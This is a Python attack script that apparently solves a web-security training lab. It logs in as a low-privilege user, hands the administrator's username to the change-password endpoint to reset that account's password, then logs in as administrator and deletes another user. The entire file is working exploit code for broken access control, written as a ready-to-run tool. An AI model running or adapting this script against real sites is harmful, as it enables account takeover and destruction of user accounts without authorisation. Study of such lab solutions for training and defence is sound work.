import requests
import sys
import urllib3
from bs4 import BeautifulSoup

import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r=s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf= soup.find("input", {'name':'csrf'})['value']
    return csrf


def delete_user(s,url):
    #Login as the administrator
    login_url = url + "/login"
    csrf_token= get_csrf_token(s, login_url)
    print("Logging as the administrator")
    data_login2= {"csrf":csrf_token, "username": "administrator", "password":"iwashere"}
    r=s.post(login_url, data=data_login2, verify=False, proxies=proxies)
    res = r.text
    if "Admin panel" in res:
        print("Successfully logged in as the Admin")

        #Delete carlos user 
        delete_carlos_url = url + "/admin/delete?username=carlos"
        r= s.get(delete_carlos_url, verify=False, proxies=proxies)

        if "Congratulations" in r.text:
            print("Carlos User has successfully been deleted")
        else:
            print("Unable to delete Carlos user")
            sys.exit(-1)

    else:
        print("Unable to login as Admin")
        sys.exit(-1)


def change_password(s,url):
    change_password_url= url + "/my-account/change-password"
    csrf_token= get_csrf_token(s, url + "/my-account")
    # Changing the adminstrator password
    print("changing the administrator password")
    data_change= {"csrf": csrf_token,"username":"administrator", "new-password-1":"iwashere", "new-password-2":"iwashere"}
    r= s.post(change_password_url, data=data_change, verify=False, proxies=proxies)
    res= r.text
    if "Password changed successfully!" in res:
        print("Password Changed Successfully")
        delete_user(s,url)
    else:
        print("Unable to change password")
        sys.exit(-1)


def delete_carlos_user(s, url):
    #get the csrf token
    login_url = url + "/login"
    csrf_token= get_csrf_token(s, login_url)

    #Login as wiener
    print("Logging in as wiener user")
    data_login= {"csrf": csrf_token,"username": "wiener", "password": "peter"}
    r= s.post(login_url, data= data_login, verify=False, proxies=proxies)
    res=r.text
    if "Log out" in res:
        print("Successfully logged in")
        change_password(s, url)
    else:
        print("Unable to login as the user")
        sys.exit(-1)





def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" %sys.argv[0])
        print("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    s= requests.Session()
    url= sys.argv[1]
    delete_carlos_user(s, url)



if __name__ == "__main__":
    main()